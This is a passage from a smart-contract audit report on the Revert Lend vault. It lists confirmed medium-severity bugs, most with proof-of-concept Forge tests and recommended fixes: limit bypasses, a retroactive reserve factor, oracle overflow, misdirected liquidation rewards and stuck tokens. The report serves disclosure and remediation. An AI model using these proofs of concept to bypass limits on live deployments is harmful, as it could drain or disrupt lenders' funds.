> About the DOS attack: There is a way to disable this attack by increasing the `dailyLimitMinValue`. The probability of someone attacking like this seems very low, so we are comfortable with this workaround.

**[ronnyx2017 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/435#issuecomment-2028543197):**
 > I do not consider this to be a high issue; the first impact is false. Regarding the second, a DoS, the attacker would suffer huge losses without gaining anything.
> 
> But I still believe the issue is valid because MEV bots have enough incentive to hold debt from the vault over multiple blocks (one by one, borrow in the index `0` tx and repay in the last index tx), which could actually lead to a deterioration in the protocol's reliability.

**[lanrebayode77 (warden) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/435#issuecomment-2033660174):**
 > @ronnyx2017 - I think the severity of this should be reconsidered due to it impact. 
> 
> Due to update mode, user can get loans without interest as long as repayment is done in the same transaction. This is the entire basis for Flashloan which also comes at a cost in popular lending platforms like AAVE and UNISWAP.
> 
> Since this action can be repeated overtime, protocol will be losing a lot as unclaimed interest fee, which would have made more funds to the LPs and protocol. Since loss of funds(fee) is evident, it's valid as a high severity.

**[ronnyx2017 (judge) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/435#issuecomment-2033721527):**
 > There is no technical disagreement, the attack you mentioned has already been described in my comments above, maintain Medium for cost and likelihood of attack.

***

## [[M-05] `setReserveFactor` fails to update global interest before updating reserve factor](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/427)
*Submitted by [thank\_you](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/427)*

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol?plain=1#L1167-L1195>

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol?plain=1#L837-L840>

### Impact

When the vault owner calls `V3Vault.setReserveFactor()`, the function updates the reserve factor for the Vault. Unfortunately, if the global interest is not updated before the reserve factor is updated, the updated reserve factor will be retroactively applied in the exchange rate formula starting at the last update. This leads to unexpected lending rate changes causing lenders to receive unexpected more or less favorable lending exchange rate depending on what the updated reserve factor value is.

### Proof of Concept

The lending rate formula is calculated ``_calculateGlobalInterest()`` and the formula can be defined as:

```solidity
(uint256 borrowRateX96, uint256 supplyRateX96) = interestRateModel.getRatesPerSecondX96(available, debt);

supplyRateX96 = supplyRateX96.mulDiv(Q32 - reserveFactorX32, Q32);

// always growing or equal
uint256 lastRateUpdate = lastExchangeRateUpdate;

if (lastRateUpdate > 0) {
    newDebtExchangeRateX96 = oldDebtExchangeRateX96 + oldDebtExchangeRateX96 * (block.timestamp - lastRateUpdate) * borrowRateX96 / Q96;
    newLendExchangeRateX96 = oldLendExchangeRateX96 + oldLendExchangeRateX96 * (block.timestamp - lastRateUpdate) * supplyRateX96 / Q96;
} else {
    newDebtExchangeRateX96 = oldDebtExchangeRateX96;
    newLendExchangeRateX96 = oldLendExchangeRateX96;
}
```

In the formula above, the supply rate is modified before being used to calculate the new lending rate as `supply rate * reserve factor`. This modified supply rate is then used to determine how much of a jump should occur in the lending rate via `newLendExchangeRateX96 = oldLendExchangeRateX96 + oldLendExchangeRateX96 * (block.timestamp - lastRateUpdate) * supplyRateX96 / Q96`. The larger the modified supply rate, the larger the jump is. The smaller the modified supply rate, the smaller the jump is.

By not updating the lending rate before updating the reserve factor, the updated reserve factor will retroactively be applied to the past artificially influencing the lending rate.

To best visualize this, let's look at the forge test below which shows two scenarios, one where the interest is updated before the reserve factor is updated and one where it's not. Then we can compare the different lending rate values and see how by not updating the exchange rates before updating the reserve factor, the lending rate is impacted.

```notes
RESULTS FROM FORGE TESTS 

with interest rate update occurring after reserve factor update:

- starting lendExchangeRateX96:  79243018781103204090820932736
- after reserve update lendExchangeRateX96:  79240047527736122590199028736

with interest rate update occurring before reserve factor update:

- starting lendExchangeRateX96:  79243018781103204090820932736
- after reserve update lendExchangeRateX96:  79243018781103204090820932736
```

```solidity
function testLendingRateReserveFactorBugWithoutInterestUpdate() external {
    vault.setLimits(1000000, 1000e18, 1000e18, 1000e18, 1000e18);

    // set up basic vault settings
    _deposit(10000000, WHALE_ACCOUNT);
    _setupBasicLoan(true);
    vm.warp(block.timestamp + 7 days);

    (,,,,,,uint lendExchangeRateX96) = vault.vaultInfo();
    console.log("old lendExchangeRateX96: ", lendExchangeRateX96);

    vm.prank(vault.owner());

    vault.setReserveFactor(uint32(Q32 / 5)); // 20% reserve factor

    // AUDIT: Calling setLimits updates the exchange rate
    vault.setLimits(1000000, 1000e18, 1000e18, 1000e18, 1000e18);


    (,,,,,,lendExchangeRateX96) = vault.vaultInfo();
    console.log("new lendExchangeRateX96: ", lendExchangeRateX96);
}

function testLendingRateReserveFactorBugWithInterestUpdate() external {
    vault.setLimits(1000000, 1000e18, 1000e18, 1000e18, 1000e18);

    // set up basic vault settings
    _deposit(10000000, WHALE_ACCOUNT);
    _setupBasicLoan(true);
    vm.warp(block.timestamp + 7 days);

    (,,,,,,uint lendExchangeRateX96) = vault.vaultInfo();
    console.log("old lendExchangeRateX96: ", lendExchangeRateX96);

    vm.prank(vault.owner());

    // AUDIT: Calling setLimits updates the exchange rate
    vault.setLimits(1000000, 1000e18, 1000e18, 1000e18, 1000e18);
    vault.setReserveFactor(uint32(Q32 / 5)); // 20% reserve factor

    (,,,,,,lendExchangeRateX96) = vault.vaultInfo();
    console.log("new lendExchangeRateX96: ", lendExchangeRateX96);
}
```

As you can see, by not updating the interest rate before updating the reserve factor, the lending rate will be impacted unfairly.

### Recommended Mitigation Steps

Add `_updateGlobalInterest()` to the `V3Vault.setReserveFactor()` function before the reserve factor is updated. This ensures that the lending rate will not be artificially impacted and the updated reserve factor is not retroactively applied to the past:

```solidity
function setReserveFactor(uint32 _reserveFactorX32) external onlyOwner {
    _updateGlobalInterest();
    reserveFactorX32 = _reserveFactorX32;
}
```

### Assessed type

Math

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/427#issuecomment-2021131729)**

**[ronnyx2017 (judge) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/427#issuecomment-2029269970):**
 > The losses are negligible, but it indeed breaks the math. 

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/23).

**Status:** Mitigation confirmed. Full details in reports from [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/28), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/82) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/11).

***

## [[M-06]  Users can lend and borrow above allowed limitations](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/415)
*Submitted by [JohnSmith](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/415), also found by [Arz](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/425), [BowTiedOriole](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/420), [FastChecker](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/396), [shaka](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/329), [Aymen0909](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/321), [deepplus](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/280), [KupiaSec](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/262), [kennedy1030](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/219), [kfx](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/211), and [DanielArmstrong](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/79)*

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1250-L1251>

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1262-L1263>

### Impact

Protocol design includes limitations on how much a user can deposit and borrow per day. So it is 10% of lent money or `dailyLendIncreaseLimitMin`/`dailyDebtIncreaseLimitMin`, whichever is greater. Current implementation is wrong and makes it 110% because of mistake in calculations; which means that users are able to deposit/borrow close to 110% amount of current assets.

Issue is in these calculations:

```solidity
    uint256 lendIncreaseLimit = _convertToAssets(totalSupply(), newLendExchangeRateX96, Math.Rounding.Up)
                * (Q32 + MAX_DAILY_LEND_INCREASE_X32) / Q32;
```

```solidity
            uint256 debtIncreaseLimit = _convertToAssets(totalSupply(), newLendExchangeRateX96, Math.Rounding.Up)
                * (Q32 + MAX_DAILY_DEBT_INCREASE_X32) / Q32;
```

### Proof of Concept

For borrow I used function `_setupBasicLoan()` already implemented by you in your tests. Add this tests beside your other tests in `test/integration/V3Vault.t.sol`:

```solidity
     function testDepositV2() external {
        vault.setLimits(0, 150000_000000, 0, 10_000000, 0);//10 usdc dailyLendIncreaseLimitMin
        uint256 balance = USDC.balanceOf(WHALE_ACCOUNT);

        vm.startPrank(WHALE_ACCOUNT);
        USDC.approve(address(vault), type(uint256).max);
        vault.deposit(10_000000 , WHALE_ACCOUNT);
        skip(1 days);
        for (uint i; i < 10; ++i) {
            uint256 assets = vault.totalAssets();
            console.log("USDC vault balance: %s", assets);
            uint amount = assets + assets * 9 / 100;// 109% 
            vault.deposit(amount, WHALE_ACCOUNT);
            skip(1 days);
        }
        uint256 assets = vault.totalAssets();
        assertEq(assets, 15902_406811);//so in 10 days we deposited 15k usdc, despite the 10 usdc daily limitation
        console.log("USDC balance: %s", assets); 
    }
    
    function testBorrowV2() external {
        vault.setLimits(0, 150_000000, 150_000000, 150_000000, 1_000000);// 1 usdc dailyDebtIncreaseLimitMin
        skip(1 days); //so we can recalculate debtIncreaseLimit again
        _setupBasicLoan(true);//borrow  8_847206 which is > 1_000000 and > 10% of USDC10_000000 in vault
    }
```

### Recommended Mitigation Steps

Fix is simple for `_resetDailyLendIncreaseLimit()`:

```diff
    uint256 lendIncreaseLimit = _convertToAssets(totalSupply(), newLendExchangeRateX96, Math.Rounding.Up)
-                * (Q32 + MAX_DAILY_LEND_INCREASE_X32) / Q32;
+                * MAX_DAILY_LEND_INCREASE_X32 / Q32;
```

And for `_resetDailyDebtIncreaseLimit()`:

```diff
            uint256 debtIncreaseLimit = _convertToAssets(totalSupply(), newLendExchangeRateX96, Math.Rounding.Up)
-                * (Q32 + MAX_DAILY_DEBT_INCREASE_X32) / Q32;
+                * MAX_DAILY_DEBT_INCREASE_X32 / Q32;
```

### Assessed type

Math

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/415#issuecomment-2021074507)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/22).

**Status:** Mitigation confirmed. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/83), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/29) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/12).

***

## [[M-07] Large decimal of `referenceToken` causes overflow at oracle price calculation](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/409)
*Submitted by [JecikPo](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/409), also found by [linmiaomiao](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/475), [kfx](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/300), [KupiaSec](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/261), [SpicyMeatball](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/238), [kennedy1030](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/215), and [t4sk](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/24)*

The price calculation at the `V3Oracle.sol` will revert upon reaching certain level when `referenceToken` is used with high decimal value (e.g. 18). The revert (specifically happening when calling `getValue()`) would make the Chainlink price feed useless; yet the TWAP price source would still be available. The protocol team would have to disable Chainlink and rely exclusively on the TWAP source reducing security of the pricing. The issue could manifest itself after certain amount of time once the project is already live and only when price returned by the feed reaches certain point.

### Proof of Concept

The following code line has an issue:

    chainlinkPriceX96 = (10 ** referenceTokenDecimals) * chainlinkPriceX96 * Q96 / chainlinkReferencePriceX96
                    / (10 ** feedConfig.tokenDecimals);

When `referenceTokenDecimals` is 18, `chainlinkPriceX96` is higher than some threshold between 18 and 19 (in Q96 notation), which will cause arithmetic overflow.

### Recommended Mitigation Steps

Instead of calculating the price this way:

    chainlinkPriceX96 = (10 ** referenceTokenDecimals) * chainlinkPriceX96 * Q96 / chainlinkReferencePriceX96
                    / (10 ** feedConfig.tokenDecimals);

It could be done the following way as per Chainlink's recommendation:

    if (referenceTokenDecimals > feedConfig.tokenDecimals)
                chainlinkPriceX96 = (10 ** referenceTokenDecimals - feedConfig.tokenDecimals) * chainlinkPriceX96 * Q96 
                / chainlinkReferencePriceX96;
            else if (referenceTokenDecimals < feedConfig.tokenDecimals)
                chainlinkPriceX96 = chainlinkPriceX96 * Q96 / chainlinkReferencePriceX96 
                / (10 ** feedConfig.tokenDecimals - referenceTokenDecimals);
            else 
                chainlinkPriceX96 = chainlinkPriceX96 * Q96 / chainlinkReferencePriceX96;

Reference [here](<https://docs.chain.link/data-feeds/using-data-feeds#getting-a-different-price-denomination>).

### Assessed type

Decimal

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/409#issuecomment-2021064600)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/21).

**Status:** Mitigation confirmed. Full details in reports from [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/3), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/84) and [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/62).

***

## [[M-08] `DailyLendIncreaseLimitLeft` and `dailyDebtIncreaseLimitLeft` are not adjusted accurately](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/400)
*Submitted by [FastChecker](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/400), also found by [DanielArmstrong](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/113)*

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L807-L949> 

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L807-L883> 

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L807-L1249>

### Vulnerability Details

When the `V3Vault.sol#_withdraw` and `V3Vault.sol#_repay` functions are called, `dailyLendIncreaseLimitLeft` and `dailyDebtIncreaseLimitLeft` are increased. However, if it is called before `_withdraw` and `_repay` are called, this increase becomes meaningless.

### Impact

Even if the `V3Vault.sol#_withdraw` and `V3Vault.sol#_repay` functions are called, `dailyLendIncreaseLimitLeft` and `dailyDebtIncreaseLimitLeft` do not increase, so the protocol does not work as intended.

### Proof of Concept

`V3Vault.sol#_withdraw` is as follows:

```solidity
    function _withdraw(address receiver, address owner, uint256 amount, bool isShare)
        internal
        returns (uint256 assets, uint256 shares)
    {
        (uint256 newDebtExchangeRateX96, uint256 newLendExchangeRateX96) = _updateGlobalInterest();

        if (isShare) {
            shares = amount;
            assets = _convertToAssets(amount, newLendExchangeRateX96, Math.Rounding.Down);
        } else {
            assets = amount;
            shares = _convertToShares(amount, newLendExchangeRateX96, Math.Rounding.Up);
        }

        // if caller has allowance for owners shares - may call withdraw
        if (msg.sender != owner) {
            _spendAllowance(owner, msg.sender, shares);
        }

        (, uint256 available,) = _getAvailableBalance(newDebtExchangeRateX96, newLendExchangeRateX96);
        if (available < assets) {
            revert InsufficientLiquidity();
        }

        // fails if not enough shares
        _burn(owner, shares);
        SafeERC20.safeTransfer(IERC20(asset), receiver, assets);

        // when amounts are withdrawn - they may be deposited again
949:    dailyLendIncreaseLimitLeft += assets;

        emit Withdraw(msg.sender, receiver, owner, assets, shares);
    }
```

As you can see, increase `dailylendIncreaselimitLeft` by the `asset` amount in `L949`. However, `V3Vault.sol#_deposit` is as follows:

```solidity
    function _deposit(address receiver, uint256 amount, bool isShare, bytes memory permitData)
        internal
        returns (uint256 assets, uint256 shares)
    {
        (, uint256 newLendExchangeRateX96) = _updateGlobalInterest();

883:    _resetDailyLendIncreaseLimit(newLendExchangeRateX96, false);

        if (isShare) {
            shares = amount;
            assets = _convertToAssets(shares, newLendExchangeRateX96, Math.Rounding.Up);
        } else {
            assets = amount;
            shares = _convertToShares(assets, newLendExchangeRateX96, Math.Rounding.Down);
        }

        if (permitData.length > 0) {
            (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory signature) =
                abi.decode(permitData, (ISignatureTransfer.PermitTransferFrom, bytes));
            permit2.permitTransferFrom(
                permit, ISignatureTransfer.SignatureTransferDetails(address(this), assets), msg.sender, signature
            );
        } else {
            // fails if not enough token approved
            SafeERC20.safeTransferFrom(IERC20(asset), msg.sender, address(this), assets);
        }

        _mint(receiver, shares);

        if (totalSupply() > globalLendLimit) {
            revert GlobalLendLimit();
        }

        if (assets > dailyLendIncreaseLimitLeft) {
            revert DailyLendIncreaseLimit();
        } else {
            dailyLendIncreaseLimitLeft -= assets;
        }

        emit Deposit(msg.sender, receiver, assets, shares);
    }
```

As you can see on the right, the `dailyLendIncreaseLimitLeft` function is called in `L883`.
`V3Vault.sol#_resetDailyLendIncreaseLimit` is as follows:

```solidity
    function _resetDailyLendIncreaseLimit(uint256 newLendExchangeRateX96, bool force) internal {
        // daily lend limit reset handling
        uint256 time = block.timestamp / 1 days;
1249:   if (force || time > dailyLendIncreaseLimitLastReset) {
            uint256 lendIncreaseLimit = _convertToAssets(totalSupply(), newLendExchangeRateX96, Math.Rounding.Up)
                * (Q32 + MAX_DAILY_LEND_INCREASE_X32) / Q32;
            dailyLendIncreaseLimitLeft =
                dailyLendIncreaseLimitMin > lendIncreaseLimit ? dailyLendIncreaseLimitMin : lendIncreaseLimit;
            dailyLendIncreaseLimitLastReset = time;
        }
    }
```

Looking at the function above, the increase of `dailyLendIncreaseLimitLeft` in the withdraw performed before depositing when a new day begins is not reflected in the `dailyLendIncreaseLimitleft` control by `L1249`. That is, the increase will not be reflected in the `dailyLendIncreaseLimitLeft` control. The same problem exists in the `repay` and `borrow` functions.

### Recommended Mitigation Steps

`VeVault.sol#_withdraw` function is modified as follows:

```solidity
    function _withdraw(address receiver, address owner, uint256 amount, bool isShare)
        internal
        returns (uint256 assets, uint256 shares)
    {
        (uint256 newDebtExchangeRateX96, uint256 newLendExchangeRateX96) = _updateGlobalInterest();
+       _resetDailyLendIncreaseLimit(newLendExchangeRateX96, false);

        if (isShare) {
            shares = amount;
            assets = _convertToAssets(amount, newLendExchangeRateX96, Math.Rounding.Down);
        } else {
            assets = amount;
            shares = _convertToShares(amount, newLendExchangeRateX96, Math.Rounding.Up);
        }

        // if caller has allowance for owners shares - may call withdraw
        if (msg.sender != owner) {
            _spendAllowance(owner, msg.sender, shares);
        }

        (, uint256 available,) = _getAvailableBalance(newDebtExchangeRateX96, newLendExchangeRateX96);
        if (available < assets) {
            revert InsufficientLiquidity();
        }

        // fails if not enough shares
        _burn(owner, shares);
        SafeERC20.safeTransfer(IERC20(asset), receiver, assets);

        // when amounts are withdrawn - they may be deposited again
        dailyLendIncreaseLimitLeft += assets;

        emit Withdraw(msg.sender, receiver, owner, assets, shares);
    }
```

`VeVault.sol#_repay` function is modified as follows:

```solidity
    function _repay(uint256 tokenId, uint256 amount, bool isShare, bytes memory permitData) internal {
        (uint256 newDebtExchangeRateX96, uint256 newLendExchangeRateX96) = _updateGlobalInterest();
+       _resetDailyLendIncreaseLimit(newLendExchangeRateX96, false);

        Loan storage loan = loans[tokenId];

        uint256 currentShares = loan.debtShares;

        uint256 shares;
        uint256 assets;

        if (isShare) {
            shares = amount;
            assets = _convertToAssets(amount, newDebtExchangeRateX96, Math.Rounding.Up);
        } else {
            assets = amount;
            shares = _convertToShares(amount, newDebtExchangeRateX96, Math.Rounding.Down);
        }

        // fails if too much repayed
        if (shares > currentShares) {
            revert RepayExceedsDebt();
        }

        if (assets > 0) {
            if (permitData.length > 0) {
                (ISignatureTransfer.PermitTransferFrom memory permit, bytes memory signature) =
                    abi.decode(permitData, (ISignatureTransfer.PermitTransferFrom, bytes));
                permit2.permitTransferFrom(
                    permit, ISignatureTransfer.SignatureTransferDetails(address(this), assets), msg.sender, signature
                );
            } else {
                // fails if not enough token approved
                SafeERC20.safeTransferFrom(IERC20(asset), msg.sender, address(this), assets);
            }
        }

        uint256 loanDebtShares = loan.debtShares - shares;
        loan.debtShares = loanDebtShares;
        debtSharesTotal -= shares;

        // when amounts are repayed - they maybe borrowed again
        dailyDebtIncreaseLimitLeft += assets;

        _updateAndCheckCollateral(
            tokenId, newDebtExchangeRateX96, newLendExchangeRateX96, loanDebtShares + shares, loanDebtShares
        );

        address owner = tokenOwner[tokenId];

        // if fully repayed
        if (currentShares == shares) {
            _cleanupLoan(tokenId, newDebtExchangeRateX96, newLendExchangeRateX96, owner);
        } else {
            // if resulting loan is too small - revert
            if (_convertToAssets(loanDebtShares, newDebtExchangeRateX96, Math.Rounding.Up) < minLoanSize) {
                revert MinLoanSize();
            }
        }

        emit Repay(tokenId, msg.sender, owner, assets, shares);
    }
```

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/400#issuecomment-2021055873)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/11).

**Status:** Mitigation confirmed. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/85), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/30) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/13).

***

## [[M-09] Liquidation reward sent to msg.sender instead of recipient ](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/389)
*Submitted by [Giorgio](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/389), also found by [thank\_you](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/426)*

<https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L1078-L1080>

### Vulnerability details

When performing liquidation the liquidator will fill the `LiquidateParams` containing the liquidation details. The issue here is that instead of sending the liquidation rewards to the `LiquidateParams.recipient`, the rewards will be sent to `msg.sender`.

### Impact

The liquidation rewards will be sent to `msg.sender` instead of the recipient, any external logic that relies on the fact that the liquidation rewards will be sent to recipient won't hold; this will influence the protocol's composability.

### Proof of Concept

In order to keep the system safe the liquidator can and is incentivised to liquidate unhealthy positions. To do so the `liquidate()` function will be fired with the appropriate parameters.
One of those parameters is the `address recipient;`; the name is quite intuitive for this one, this is where the liquidation rewards are expected to sent.

But if we follow the `liquidation()` function logic, the rewards will not be sent to recipient address. This [piece of code](https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L741-L742) handles the reward distribution.

    (amount0, amount1) =
                _sendPositionValue(params.tokenId, state.liquidationValue, 
    @>  state.fullValue, state.feeValue, msg.sender); 

We can see that `msg.sender` is being used instead of `params.recipient`.

### Recommended Mitigation Steps

The mitigation is straight forward. Use `params.recipient` instead of `msg.sender` for that specific call.

```diff

     (amount0, amount1) =
            _sendPositionValue(params.tokenId, state.liquidationValue, 
 --    state.fullValue, state.feeValue, msg.sender); 
 ++    state.fullValue, state.feeValue, params.recipient); 
```

### Assessed type

Context

**[kalinbas (Revert) confirmed](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/389#issuecomment-2030514150)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/20).

**Status:** Mitigation confirmed. Full details in reports from [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/31), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/86) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/15).

***

## [[M-10] Users's tokens stuck in `AutoCompound` after Vault is deactivated](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/365)
*Submitted by [ktg](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/365)*

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/Automator.sol#L79-L82>

<https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/transformers/AutoCompound.sol#L201-L207>

### Proof of Concept

Contract `AutoCompound` inherits `Automator` contract and it contains a function allowing the owner to disable a vault:

```solidity
function setVault(address _vault, bool _active) public onlyOwner {
        emit VaultChanged(_vault, _active);
        vaults[_vault] = _active;
    }
```

Unlike `AutoExit` and `AutoRange` in which disabling `Vault` has no effect, if vault is disabled in `AutoCompound` then user cannot withdraw their balances:

```solidity
function withdrawLeftoverBalances(uint256 tokenId, address to) external nonReentrant {
        address owner = nonfungiblePositionManager.ownerOf(tokenId);
        if (vaults[owner]) {
            owner = IVault(owner).ownerOf(tokenId);
        }
        if (owner != msg.sender) {
            revert Unauthorized();
        }

        (,, address token0, address token1,,,,,,,,) = nonfungiblePositionManager.positions(tokenId);

        uint256 balance0 = positionBalances[tokenId][token0];
        if (balance0 > 0) {
            _withdrawBalanceInternal(tokenId, token0, to, balance0, balance0);
        }
        uint256 balance1 = positionBalances[tokenId][token1];
        if (balance1 > 0) {
            _withdrawBalanceInternal(tokenId, token1, to, balance1, balance1);
        }
    }
```

As you can see in the first lines, if `vaults[owner] = false`, then `owner` must equal `msg.sender`, this will not be the case if the user has deposited their position to the Vault and hence cannot withdraw their balances.

Below is a POC for the above issue. Save this test case to file `test/integration/automators/AutoCompound.t.sol` and run it using command:

`forge test --match-path test/integration/automators/AutoCompound.t.sol --match-test testTokenStuck -vvvv`

```solidity
function testTokenStuck() external {
        vm.prank(TEST_NFT_2_ACCOUNT);
        NPM.approve(address(autoCompound), TEST_NFT_2);

        (,,,,,,, uint128 liquidity,,,,) = NPM.positions(TEST_NFT_2);
        assertEq(liquidity, 80059851033970806503);
         vm.prank(OPERATOR_ACCOUNT);
        autoCompound.execute(AutoCompound.ExecuteParams(TEST_NFT_2, false, 0));
         (,,,,,,, liquidity,,,,) = NPM.positions(TEST_NFT_2);
        assertEq(liquidity, 99102324844935209920);

        // Mock call to  nonfungiblePositionManager.ownerOf to simulate
        // vault change
        // 0xC36442b4a4522E871399CD717aBDD847Ab11FE88 is the address of nonfungiblePositionManager
        // 0x6352211e is ERC721 function signature of `ownerOf`

        address vault = address(0x123);
        vm.mockCall(
            0xC36442b4a4522E871399CD717aBDD847Ab11FE88,(abi.encodeWithSelector(
            0x6352211e,TEST_NFT_2)
        ),
            abi.encode(vault)
        );

        // Withdraw leftover
        vm.prank(TEST_NFT_2_ACCOUNT);
        vm.expectRevert();
        autoCompound.withdrawLeftoverBalances(TEST_NFT_2, TEST_NFT_2_ACCOUNT);
        
    }
```

In this test case, I simulate the disabling of vault by `mockCall` the result of `nonfungiblePositionManager.ownerOf(tokenId)` to `address(0x123)`, since this address is not vault then the condition `vaults[owner]` is false.

### Recommended Mitigation Steps

I recommend checking the total user left tokens in variable `positionBalances` and only allow deactivating the current Vault if the number if zero.

### Assessed type

Invalid Validation

**[kalinbas (Revert) confirmed and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/365#issuecomment-2021018358):**
 > Agree this to be an issue. Probably will make whitelisting vaults in automators be a non-reversible action.

**[ronnyx2017 (judge) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/365#issuecomment-2028607983):**
 > A temporary, mitigable DoS caused by normal administrative operations, so a valid Medium.

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/18).

**Status:** Mitigation confirmed. Full details in reports from [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/87), [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/32) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/2).

***

## [[M-11] Lack of safety buffer in `_checkLoanIsHealthy` could subject users who take out the max loan into a forced liquidation](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/363)
*Submitted by [CRYP70](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/363), also found by [alix40](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/412), [shaka](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/336), and [atoko](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/304)*

The `_checkLoanIsHealthy` function is used in the `V3Vault` to assess a user’s given position and determine the health factor of the loan. As there is no safety buffer when checking the health factor of a given position, users could be subject to a negative health factor if there are minor movements in the market which could result in liquidation or in the worst case scenario, an attacker could force a liquidation on a user and profit by sinking their position in the Uniswap pool.

### Vulnerability Details

The `_checkLoanIsHealthy` function holds the implementation to check if a users position is healthy and will return false if the position not able to be liquidated by obtaining the full value of the collateral inclusive of fees through the oracle by the `tokenId` . The `collateralValue` is then calculated from `_calculateTokenCollateralFactorX32` . Finally, we return whether the `collateralValue` is greater than or equal to the debt requested:

```solidity
    function _checkLoanIsHealthy(uint256 tokenId, uint256 debt)
        internal
        view
        returns (bool isHealthy, uint256 fullValue, uint256 collateralValue, uint256 feeValue)
    {
        (fullValue, feeValue,,) = oracle.getValue(tokenId, address(asset));

        uint256 collateralFactorX32 = _calculateTokenCollateralFactorX32(tokenId);
        collateralValue = fullValue.mulDiv(collateralFactorX32, Q32);
        isHealthy = collateralValue >= debt;
    }
```

